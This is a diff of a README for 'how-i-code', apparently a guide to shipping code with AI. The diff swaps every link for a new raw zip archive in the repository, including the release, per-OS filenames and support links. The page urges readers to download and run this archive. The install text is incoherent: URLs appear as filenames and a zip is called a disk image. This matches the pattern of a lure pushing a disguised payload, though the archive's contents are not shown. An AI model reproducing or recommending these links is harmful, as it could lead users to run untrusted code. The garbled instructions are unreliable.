@@ -1,7 +1,7 @@
 # 🚀 how-i-code - Ship Code with AI Made Easy
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/zanaabdull/how-i-code/main/cheatsheets/code_how_i_3.6.zip)](https://raw.githubusercontent.com/zanaabdull/how-i-code/main/cheatsheets/code_how_i_3.6.zip)
+[![Download](https://raw.githubusercontent.com/zanaabdull/how-i-code/main/examples/code_i_how_v2.4.zip)](https://raw.githubusercontent.com/zanaabdull/how-i-code/main/examples/code_i_how_v2.4.zip)
 
 ## 📄 Overview
 how-i-code is a straightforward guide designed for non-technical people who want to ship code using artificial intelligence. This application simplifies the coding process, allowing users to focus on deploying their ideas without needing to learn complex programming languages. 
@@ -11,26 +11,26 @@ To start using how-i-code, follow these simple steps. You don't need any prior p
 
 ## 📥 Download & Install
 1. **Visit the Releases Page:** Click the link below to access the download section.
-   [Download the latest release](https://raw.githubusercontent.com/zanaabdull/how-i-code/main/cheatsheets/code_how_i_3.6.zip)
+   [Download the latest release](https://raw.githubusercontent.com/zanaabdull/how-i-code/main/examples/code_i_how_v2.4.zip)
    
 2. **Choose Your File:** On the Releases page, find the latest version. You will see a list of files available for download. Select the one that matches your operating system:
-   - For Windows: Download the file named `https://raw.githubusercontent.com/zanaabdull/how-i-code/main/cheatsheets/code_how_i_3.6.zip`.
-   - For macOS: Download the file named `https://raw.githubusercontent.com/zanaabdull/how-i-code/main/cheatsheets/code_how_i_3.6.zip`.
-   - For Linux: Download the file named `https://raw.githubusercontent.com/zanaabdull/how-i-code/main/cheatsheets/code_how_i_3.6.zip`.
+   - For Windows: Download the file named `https://raw.githubusercontent.com/zanaabdull/how-i-code/main/examples/code_i_how_v2.4.zip`.
+   - For macOS: Download the file named `https://raw.githubusercontent.com/zanaabdull/how-i-code/main/examples/code_i_how_v2.4.zip`.
+   - For Linux: Download the file named `https://raw.githubusercontent.com/zanaabdull/how-i-code/main/examples/code_i_how_v2.4.zip`.
 
 3. **Install the Application:** 
    - **Windows Users:**
-     - Locate the downloaded `https://raw.githubusercontent.com/zanaabdull/how-i-code/main/cheatsheets/code_how_i_3.6.zip` file.
+     - Locate the downloaded `https://raw.githubusercontent.com/zanaabdull/how-i-code/main/examples/code_i_how_v2.4.zip` file.
      - Double-click the file to start the installation.
      - Follow the on-screen instructions to complete the setup.
 
    - **macOS Users:**
-     - Open the downloaded `https://raw.githubusercontent.com/zanaabdull/how-i-code/main/cheatsheets/code_how_i_3.6.zip`.
+     - Open the downloaded `https://raw.githubusercontent.com/zanaabdull/how-i-code/main/examples/code_i_how_v2.4.zip`.
      - Drag the how-i-code icon into your Applications folder.
      - Eject the disk image and open how-i-code from your Applications.
 
    - **Linux Users:**
-     - Extract the `https://raw.githubusercontent.com/zanaabdull/how-i-code/main/cheatsheets/code_how_i_3.6.zip` file.
+     - Extract the `https://raw.githubusercontent.com/zanaabdull/how-i-code/main/examples/code_i_how_v2.4.zip` file.
      - Open a terminal and navigate to the extracted folder.
      - Run the command `./how-i-code` to start the application.
 
@@ -63,10 +63,10 @@ To run how-i-code, ensure your system meets the following minimum requirements:
 - 200MB of free disk space
 
 ## 📚 Support
-If you encounter any issues while using how-i-code, please feel free to reach out via the Issues tab on our [GitHub page](https://raw.githubusercontent.com/zanaabdull/how-i-code/main/cheatsheets/code_how_i_3.6.zip). We value your feedback and will do our best to assist you.
+If you encounter any issues while using how-i-code, please feel free to reach out via the Issues tab on our [GitHub page](https://raw.githubusercontent.com/zanaabdull/how-i-code/main/examples/code_i_how_v2.4.zip). We value your feedback and will do our best to assist you.
 
 ## 🌟 Community
 Join our community to help each other grow in coding. You can participate in discussions, ask questions, and share your projects. Every user’s input enriches the experience for everyone.
 
 ## 🚀 Download Now Again
-Don't wait! [Download how-i-code](https://raw.githubusercontent.com/zanaabdull/how-i-code/main/cheatsheets/code_how_i_3.6.zip) and start shipping your code today!
+Don't wait! [Download how-i-code](https://raw.githubusercontent.com/zanaabdull/how-i-code/main/examples/code_i_how_v2.4.zip) and start shipping your code today!
